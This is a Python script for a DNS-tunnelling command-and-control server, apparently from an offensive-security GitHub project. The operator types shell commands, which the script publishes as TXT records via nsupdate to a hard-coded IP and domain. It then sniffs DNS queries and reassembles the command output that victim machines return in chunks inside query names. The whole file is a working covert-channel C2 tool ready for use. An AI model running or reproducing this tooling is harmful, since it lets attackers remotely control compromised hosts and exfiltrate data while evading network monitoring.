import subprocess
from scapy.all import sniff, DNS
from termcolor import colored

DNS_SERVER = "159.223.6.139"
DOMAIN = "command.connect.menorraitdev.net"


def print_banner():
    """
    Prints the banner at the start of the program.
    """
    banner = """
  ____ _____     ____  _   _ ____
 / ___|_   _|__ |  _ \\| \\ | / ___|
| |     | |/ _ \\| | | |  \\| \\___ \\
| |___  | | (_) | |_| | |\\  |___) |
 \\____| |_|\\___/|____/|_| \\_|____/
"""
    print(colored(banner, "cyan", attrs=["bold"]))
    print(colored("By ShkudW", "yellow", attrs=["bold"]))
    print(colored("https://github.com/ShkudW/CToDNS", "yellow", attrs=["bold"]))
    print("\n")


def update_txt_record(command):
    """
    Update a TXT record dynamically using nsupdate.
    """
    nsupdate_cmds = f"""
server {DNS_SERVER}
update delete {DOMAIN} TXT
update add {DOMAIN} 60 TXT "{command}"
send
"""
    try:
        subprocess.run(
            ["nsupdate"], input=nsupdate_cmds, text=True, capture_output=True, check=True
        )
    except subprocess.CalledProcessError as e:
        print(colored(f"Failed to update TXT record: {e.stderr}", "red"))


def replace_underscores_with_spaces(data):
    """
    Replace underscores with spaces in the received data.
    """
    return data.replace("_", " ")


def format_output(data):
    """
    Format command output for better readability.
    """
    lines = data.split("_")
    formatted_lines = "\n".join(line.strip() for line in lines if line.strip())
    return formatted_lines


def listen_for_dns_packets():
    """
    Listen for incoming DNS packets and handle chunks.
    """
    chunks = {}
    expected_chunks = 0
    unique_id = None

    while True:
        packet = sniff(filter="udp port 53", count=1, timeout=60)[0]
        if packet and packet.haslayer(DNS) and packet[DNS].qd:
            query_name = packet[DNS].qd.qname.decode().lower().strip()

            if "start" in query_name:
                unique_id = query_name.split("-")[0]
            elif "chunks" in query_name:
                try:
                    expected_chunks = int(query_name.split("-")[0].replace("chunks", ""))
                except ValueError:
                    continue
            elif "chunk" in query_name:
                try:
                    chunk_index = int(query_name.split("-")[0].replace("chunk", ""))
                    chunk_data = "-".join(query_name.split("-")[1:]).split(".")[0]
                    chunks[chunk_index] = chunk_data
                except Exception:
                    continue
            elif "end" in query_name:
                if len(chunks) == expected_chunks:
                    sorted_chunks = [chunks[i] for i in sorted(chunks.keys())]
                    full_data = "".join(sorted_chunks)

                    # Replace underscores with spaces
                    full_data = replace_underscores_with_spaces(full_data)

                    # Format the output for better readability
                    formatted_output = format_output(full_data)

                    print(colored(f"\n{formatted_output}\n", "green", attrs=["bold"]))
                    chunks.clear()
                    expected_chunks = 0
                    break


if __name__ == "__main__":
    print_banner()
    print(colored("C2 Server Started. Type 'exit' to quit.", "yellow", attrs=["bold"]))
    while True:
        try:
            command = input("\nEnter command to execute: ").strip()
            if command.lower() == "exit":
                print(colored("Exiting C2 Server.", "yellow", attrs=["bold"]))
                break

            update_txt_record(command)
            listen_for_dns_packets()
        except KeyboardInterrupt:
            print(colored("\nExiting C2 Server.", "yellow", attrs=["bold"]))
            break